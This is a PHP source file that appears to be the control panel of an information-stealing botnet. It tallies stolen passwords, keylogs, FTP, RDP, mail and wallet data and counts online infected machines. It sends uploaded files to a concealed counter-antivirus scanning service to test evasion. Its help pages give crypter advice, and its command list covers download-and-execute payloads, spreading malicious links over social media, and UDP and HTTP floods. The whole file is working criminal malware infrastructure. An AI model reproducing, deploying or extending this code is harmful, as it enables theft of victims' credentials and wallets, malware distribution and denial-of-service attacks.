<?php
session_start();

require_once('inc/functions.php');
banned();
require_once('inc/session.php');
require_once('inc/html_grund.php');
include('inc/counts.php');
include('inc/cron.php');
require_once('inc/config.php');

$logpos = count(glob($folder."/dump/{*.log}", GLOB_BRACE));
$logsc  = count(glob($folder."/scr/{*.jpg}", GLOB_BRACE));
$logpw  = count(glob($folder."/pass/{*.LOG}", GLOB_BRACE));
$logms  = count(glob($folder."/ins/{*.Log}", GLOB_BRACE));
$logft  = count(glob($folder."/ftp/{*.txt}", GLOB_BRACE));
$logrp  = count(glob($folder."/rdp/{*.TXT}", GLOB_BRACE));
$logml  = count(glob($folder."/mail/{*.TxT}", GLOB_BRACE));
$logky  = count(glob($folder."/kyl/{*.html}", GLOB_BRACE));
$logwl  = count(glob($folder."/wallet/{*.wallet}", GLOB_BRACE));

$logtotal = $logpos + $logsc + $logpw + $logft + $logrp + $logms + $logml + $logky + $logwl;

if (isset($_POST['Host']))
  {
    file_put_contents('inc/blacklist.php', $_POST['Host']);
    header('location: home.php?m=blacklist');
  }

if (isset($_POST['ousr']))
  {
   if($_POST['ousr'] === "")
    {
     $note = '<font color="red">The current username field is empty</font>';
    }
   else
    {
      if($_POST['nusr'] === "")
       {
         $note = '<font color="red">The new username field is empty</font>';
       }
      else
       {  
         if(strpos($correctuser, base64_encode($_POST['ousr'])) === false)
          {
            $note = '<font color="red">The current username is wrong</font>';
          }
        else
          {
            $str = file_get_contents('inc/config.php');
            $str = str_replace($correctuser, base64_encode($_POST['nusr']), $str);
            file_put_contents('inc/config.php', $str);
            $note = '<font color="green">Username successfully updated</font>';
         }
       }
     }
   }
   
  
if (isset($_POST['opwd']))
  {
   if($_POST['opwd'] === "")
    {
     $note = '<font color="red">The current password field is empty</font>';
    }
   else
    {
      if($_POST['npwd'] === "")
       {
         $note = '<font color="red">The new password field is empty</font>';
       }
      else
       {  
         if(strpos($correctpass, md5($_POST['opwd'])) === false)
          {
            $note = '<font color="red">The current password is wrong</font>';
          }
        else
          {
            $str = file_get_contents('inc/config.php');
            $str = str_replace($correctpass, md5($_POST['npwd']), $str);
            file_put_contents('inc/config.php', $str);
            $note = '<font color="green">Password successfully updated</font>';
         }
       }
     }
   }
   
if (isset($_POST['ousa']))
  {
   if($_POST['ousa'] === "")
    {
     $note = '<font color="red">The current user-agent field is empty</font>';
    }
   else
    {
      if($_POST['nusa'] === "")
       {
         $note = '<font color="red">The new user-agent field is empty</font>';
       }
      else
       {  
         if(strpos($usa, $_POST['ousa']) === false)
          {
            $note = '<font color="red">The current user-agent is wrong</font>';
          }
        else
          {
            $str = file_get_contents('inc/config.php');
            $str = str_replace($usa, $_POST['nusa'], $str);
            file_put_contents('inc/config.php', $str);
            $note = '<font color="green">User-agent successfully updated</font>';
         }
       }
     }
   }

if (isset($_POST['ocnk']))
  {
   if($_POST['ocnk'] === "")
    {
     $note = '<font color="red">The current connection key field is empty</font>';
    }
   else
    {
      if($_POST['ncnk'] === "")
       {
         $note = '<font color="red">The new connection key is empty</font>';
       }
      else
       {  
         if(strpos($RC4, $_POST['ocnk']) === false)
          {
            $note = '<font color="red">The current connection key is wrong</font>';
          }
        else
          {
            $str = file_get_contents('inc/config.php');
            $str = str_replace($RC4, $_POST['ncnk'], $str);
            file_put_contents('inc/config.php', $str);
            $note = '<font color="green">Connection key successfully updated</font>';
         }
       }
     }
   }

echo '<link rel="stylesheet" href="css/home.css"/>

<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js"></script>
		
	<script type="text/javascript">
    	$(document).ready(function(){
      		refreshBotsOnline();
    	});
    	
    	function refreshBotsOnline(){
        	$(\'#nav\').load(\'inc/html_menu.php\');
        	setTimeout(refreshBotsOnline, 5000);
    	}
	</script>
	
<style scoped>

 .button-success
  {
   color: white;
   border-radius: 4px;
   text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
  }

 .button-success 
  {
   background: rgb(28, 184, 65); /* this is a green */
  }

</style>';

if ($_GET['m'] == 'dashboard')
  {
    echo '<div id="acontent"> 
    <div id="abody"> 
       <div id="aleft">        
       	<span><b>Total Bots:</b></span>      
       	<center><span class="blue">' . $totalbots . '</span></center>
       </div> 
       <div id="aright"> 
       	<span><b>Total Logs:</b></span>       
       	<center><span class="pink">' . $logtotal . '</span></center>
       </div> 
       <div id="acenter"> 
       	<center><span><b>Online Bots:</b></span></center>       
       	<center><span class="green">' . $online . '</span></center>
       </div>
       <br>
       <center><img src="img/logo.png"></center>
     </div> 
  </div>';
  }
  
if ($_GET['m'] == 'username')
  {
  
  echo '</div>
<h2><b>Change Username</b></h2>
<hr>
  <link rel="stylesheet" type="text/css" href="css/log.css"/>
<link rel="stylesheet" type="text/css" href="css/button.css"/>
  <div class="datagrid">
  <table>  
    <tbody>
      <tr>
        <td>
         <form action="home.php?m=username" method="POST">
          <label for="usr"><b>Current username:<b/b></label>
          <input type="text" maxlength="8" min="1" class="form-control" name="ousr">
          <br>
          <label for="usr"><b>New username:</b></label>
          <input type="text" maxlength="8" class="form-control" name="nusr">
          <br>
          <center><input class="button-success" type="submit" value="Change username" name="B1"></center>
         </form>
        </td>
     </tr>  
   </tbody>
 </table>
 <br>
 <center><b><big>'; echo $note; echo'</b></big></center>
 </div>';
  }

if ($_GET['m'] == 'password')
  {
  echo '</div>
 <h2><b>Change Password</b></h2>
<hr>
  <link rel="stylesheet" type="text/css" href="css/log.css"/>
<link rel="stylesheet" type="text/css" href="css/button.css"/>
  <div class="datagrid">
  <table>  
    <tbody>
      <tr>
        <td>
         <form action="home.php?m=password" method="POST">
          <label for="opwd"><b>Current password:</b></label>
          <input type="text" class="form-control" name="opwd">
          <br>
          <label for="npwd"><b>New password:</b></label>
          <input type="text" class="form-control" name="npwd">
          <br>
          <center><input class="button-success" type="submit" value="Change password" name="B2"></center>
         </form>
        </td>
     </tr>  
   </tbody>
 </table>
 <br>
 <center><b><big>'; echo $note; echo'</b></big></center>
 </div>';
  }
  
if ($_GET['m'] == 'agent')
  {
  echo '</div>
 <h2><b>Change User-Agent</b></h2>
<hr>
  <link rel="stylesheet" type="text/css" href="css/log.css"/>
<link rel="stylesheet" type="text/css" href="css/button.css"/>
  <div class="datagrid">
  <table>  
    <tbody>
      <tr>
        <td>
         <form action="home.php?m=agent" method="POST">
          <label for="ousa"><b>Current user-agent:</b></label>
          <input type="text" class="form-control" name="ousa" value='.$usa.'>
          <br>
          <label for="nusa"><b>New user-agent:</b></label>
          <input type="text" class="form-control" name="nusa">
          <br>
          <center><input class="button-success" type="submit" value="Change user-agent" name="B3"></center>
         </form>
        </td>
     </tr>  
   </tbody>
 </table>
 <br>
 <center><b><big>'; echo $note; echo'</b></big></center>
 </div>';
  }
  
if ($_GET['m'] == 'connection')
  {
  echo '</div>
 <h2><b>Change Connection Key</b></h2>
<hr>
  <link rel="stylesheet" type="text/css" href="css/log.css"/>
<link rel="stylesheet" type="text/css" href="css/button.css"/>
  <div class="datagrid">
  <table>  
    <tbody>
      <tr>
        <td>
         <form action="home.php?m=connection" method="POST">
          <label for="ocnk"><b>Current connection key:</b></label>
          <input type="text" class="form-control" name="ocnk" value='.$RC4.'>
          <br>
          <label for="ncnk"><b>New connection key:</b></label>
          <input type="text" class="form-control" name="ncnk">
          <br>
          <center><input class="button-success" type="submit" value="Update connection key" name="B4"></center>
         </form>
        </td>
     </tr>  
   </tbody>
 </table>
 <br>
 <center><b><big>'; echo $note; echo'</b></big></center>
 </div>';
  }
  
if ($_GET['m'] == 'blacklist')
  {
  echo '</div><h2><b>IP Blacklist</b></h2>
<hr><form action="home.php?m=blacklist" method="POST" align="center" style="line-height: 25px">
				   <font size="3">Enter the blacklisted IPs in the following format:</font>
				   <br>
				   <font size="3">127.0.0.1:&lt;reason ID&gt;</font>
				   <br>
				   <font size="3">IDs: <b>1</b> = Bruterforce, <b>2</b> = Wrong User-Agent, <b>3</b> = Unauthorized Upload Attempt, <b>4</b> = Other</font>
				   <br>
				   <textarea rows="15" name="Host" cols="300" style="width:60%; text-align:left;">'.file_get_contents('inc/blacklist.php').'</textarea>
				   <br><input class="button-success" type="submit" value="Save"; name="B1">	
			</form>';
  }

if ($_GET['m'] == 'result')
{
     
	if (isset($_POST['submit']))
	{
		$request = curl_init(base64_decode('aHR0cDovL3d3dy5yZWZ1ZC5tZS9hcGkucGhwP2F1dGhfdG9rZW49WW91clRva2VuTTgmdHlwZT10ZXh0'));
		$target_path = basename($_FILES['fileToUpload']['name']);
		if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_path))
		{
			curl_setopt($request, CURLOPT_POST, true);
			curl_setopt($request, CURLOPT_POSTFIELDS, array(
				'file' => '@' . $_FILES['fileToUpload']['name']
			));
			curl_setopt($request, CURLOPT_RETURNTRANSFER, true);
			$data = '[' . curl_exec($request) . ']';
			$json = json_decode(str_replace(array(' ','(',')','-','.') , '', $data));
			curl_close($request);
			@unlink($_FILES['fileToUpload']['name']);
			echo '
<style type="text/css">
.tg  {border-collapse:collapse;border-spacing:2;}
.tg td{font-family:Arial, sans-serif;font-size:16px;padding:12px 7px;border-style:solid;border-width:1px;overflow:hidden;word-break:normal;}
.tg th{font-family:Arial, sans-serif;font-size:16px;font-weight:normal;padding:12px 7px;border-style:solid;border-width:3px;overflow:hidden;word-break:normal;}
</style>
<h2><b>File Scanner</b></h2>
<hr>
<form action="home.php?m=result" method="post" enctype="multipart/form-data">
    <input type="file" name="fileToUpload" id="fileToUpload">
    <input type="submit" value="Scan File" name="submit">
</form>
<br>
<center><table class="tg">
  <tr>
    <th class="tg-031e" align="center"><b>Total Detections:</b></th>
    '.colour2($json[0]->result).'
  </tr>
  <tr>
    <td class="tg-031e" align="center"><b>Antivirus</b></td>
    <td class="tg-031e" align="center"><b>Detection</b></td>
  </tr>
  <tr>
    <td class="tg-031e">AVG Free</td>
    '.colour($json[0]->AVGFree).'
  </tr>
  <tr>
    <td class="tg-031e">Avast</td>
    '.colour($json[0]->Avast).'
  </tr>
  <tr>
    <td class="tg-031e">AntiVir (Avira)</td>
    '.colour($json[0]->AntiVirAvira).'
  </tr>
  <tr>
    <td class="tg-031e">BitDefender</td>
    '.colour($json[0]->BitDefender).'
  </tr>
  <tr>
    <td class="tg-031e">Clam Antivirus</td>
    '.colour($json[0]->ClamAntivirus).'
  </tr>
  <tr>
    <td class="tg-031e">COMODO Internet Security</td>
    '.colour($json[0]->COMODOInternetSecurity).'
  </tr>
  <tr>
    <td class="tg-031e">Dr.Web</td>
    '.colour($json[0]->DrWeb).'
  </tr>
  <tr>
    <td class="tg-031e">eTrust-Vet</td>
    '.colour($json[0]->eTrustVet).'
  </tr>
  <tr>
    <td class="tg-031e">F-PROT Antivirus</td>
    '.colour($json[0]->FPROTAntivirus).'
  </tr>
  <tr>
    <td class="tg-031e">F-Secure Internet Security</td>
    '.colour($json[0]->FSecureInternetSecurity).'
  </tr>
  <tr>
    <td class="tg-031e">G Data</td>
    '.colour($json[0]->GData).'
  </tr>
  <tr>
    <td class="tg-031e">IKARUS Security</td>
    '.colour($json[0]->IKARUSSecurity).'
  </tr>
  <tr>
    <td class="tg-031e">Kaspersky Antivirus</td>
    '.colour($json[0]->KasperskyAntivirus).'
  </tr>
  <tr>
    <td class="tg-031e">McAfee</td>
    '.colour($json[0]->McAfee).'
  </tr>
  <tr>
    <td class="tg-031e">MS Security Essentials</td>
    '.colour($json[0]->MSSecurityEssentials).'
  </tr>
  <tr>
    <td class="tg-031e">ESET NOD32</td>
    '.colour($json[0]->ESETNOD32).'
  </tr>
  <tr>
    <td class="tg-031e">Norman</td>
    '.colour($json[0]->Norman).'
  </tr>
  <tr>
    <td class="tg-031e">Norton Antivirus</td>
    '.colour($json[0]->NortonAntivirus).'
  </tr>
  <tr>
    <td class="tg-031e">Panda Security</td>
    '.colour($json[0]->PandaSecurity).'
  </tr>
  <tr>
    <td class="tg-031e">A-Squared</td>
    '.colour($json[0]->ASquared).'
  </tr>
  <tr>
    <td class="tg-031e">Quick Heal Antivirus</td>
    '.colour($json[0]->QuickHealAntivirus).'
  </tr>
  <tr>
    <td class="tg-031e">Solo Antivirus</td>
    '.colour($json[0]->SoloAntivirus).'
  </tr>
  <tr>
    <td class="tg-031e">Sophos</td>
    '.colour($json[0]->Sophos).'
  </tr>
  <tr>
    <td class="tg-031e">Trend Micro Internet Security</td>
    '.colour($json[0]->TrendMicroInternetSecurity).'
  </tr>
  <tr>
    <td class="tg-031e">VBA32 Antivirus</td>
    '.colour($json[0]->VBA32Antivirus).'
  </tr>
  <tr>
    <td class="tg-031e">Zoner AntiVirus</td>
    '.colour($json[0]->ZonerAntiVirus).'
  </tr>
  <tr>
    <td class="tg-031e">Ad-Aware</td>
    '.colour($json[0]->AdAware).'
  </tr>
  <tr>
    <td class="tg-031e">BullGuard</td>
    '.colour($json[0]->BullGuard).'
  </tr>
  <tr>
    <td class="tg-031e">FortiClient</td>
    '.colour($json[0]->FortiClient).'
  </tr>
  <tr>
    <td class="tg-031e">K7 Ultimate</td>
    '.colour($json[0]->K7Ultimate).'
  </tr>
  <tr>
    <td class="tg-031e">NANO Antivirus</td>
    '.colour($json[0]->NANOAntivirus).'
  </tr>
  <tr>
    <td class="tg-031e">Panda CommandLine</td>
    '.colour($json[0]->PandaCommandLine).'
  </tr>
  <tr>
    <td class="tg-031e">SUPERAntiSpyware</td>
    '.colour($json[0]->SUPERAntiSpyware).'
  </tr>
  <tr>
    <td class="tg-031e">Twister Antivirus</td>
    '.colour($json[0]->TwisterAntivirus).'
  </tr>
  <tr>
    <td class="tg-031e">VIPRE</td>
    '.colour($json[0]->VIPRE).'
  </tr>
</table></center>';
		}
		else
		{
			echo "Unknown Error, Please try again";
		}
	}
}

if ($_GET['m'] == 'scan')
{
	echo '
<h2><b>File Scanner</b></h2>
<hr>
<form action="home.php?m=result" method="post" enctype="multipart/form-data">
    <input type="file" name="fileToUpload" id="fileToUpload">
    <input type="submit" value="Scan File" name="submit">
</form>';
}

if ($_GET['m'] == 'help')
{
  echo '<h2><b>Frequently Asked Questions</b></h2>
 <hr>
<form align="left" style="line-height: 20px">
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Why my bot is not connecting?</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.- Make sure the user-agent of your bot match with the panel user-agent.</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.- Make sure the connection key of your bot match with the panel connection key.</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.- Clean your system of previously infections, cant be running two bots with the same configurations on a PC.</font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Why Im just getting reports but the bot doesnt appear on the panel?</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.- Maybe youre ticking "stealer mode" on the builder, untick it and try again.</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.- Or the bot user-agent is wrong.</font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Why is taking so long the connection of the bot?</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Maybe youre using a big time on the builder, you can use your custom time for each connection.</font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Which crypter should I use?</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The bot is codded for crypter compatibily so you will not have problems with that, just avoid the .NET crypters.</font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Im not getting reports. Why?</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The most likely reason is the bot have not stored any kind of passwords.</font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Why my panel is not working properly?</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.- You need a PHP version => 5.0.</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.- You need a MySQL support.</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.- You need cURL support.</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4.- You need ZIP/UNZIP support.</font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Should I send a grabber task for get reports?</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If you tick "Automatic Grabbers" on the builder is not necessary send any grabber task.</font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>There is some addresses on my IP blacklist, but I didnt write them. Why?</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;This panel version automatic blacklisted suspicious activities, like upload files without authorization or an invalid user-agent on the bots gate.</font>
<br><br>
</form>';
}

if ($_GET['m'] == 'commands')
{
	echo '
<h2><b>Bot Commands</b></h2>
<hr>
<form align="left" style="line-height: 20px">
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Download & Execute (Memory)</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;Direct URL for download&gt;</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;example: <tt>http://www.site.com/file.exe</tt></font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Download & Execute (Disk)</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;Direct URL for download&gt;</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;example: <tt>http://www.site.com/file.exe</tt></font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Open Website [Visible]</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;URL to navigate&gt;</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;example: <tt>http://www.site.com/</tt></font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Open Website [Hidden]</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;URL to navigate&gt;</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;example: <tt>http://www.site.com/</tt></font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Homepage Changer</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;Homepage&gt;</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;example: <tt>http://www.site.com</tt></font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>FB/Twitter Spread</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;Message to spread&gt;</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;example: <tt>Hey! check this out!: http://www.site.com/file.exe</tt></font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>UDP Flood</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;IP&gt;@&lt;Time in seconds&gt;</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;example: <tt>192.168.131.23@60</font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>HTTP Flood</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;IP&gt;@&lt;DNS&gt;@&lt;Socks&gt;@&lt;Time in seconds&gt;</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;example: <tt>192.168.131.23@http://www.site.com/@1000@60</font>
<br><br>
<font size="4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>Update</b></font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;Direct URL from update&gt;</font>
<br>
<font size="3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;example: <tt>http://www.site.com/file.exe</font>
<br><br>
</form>';
}

require_once('inc/html_footer.php');
?>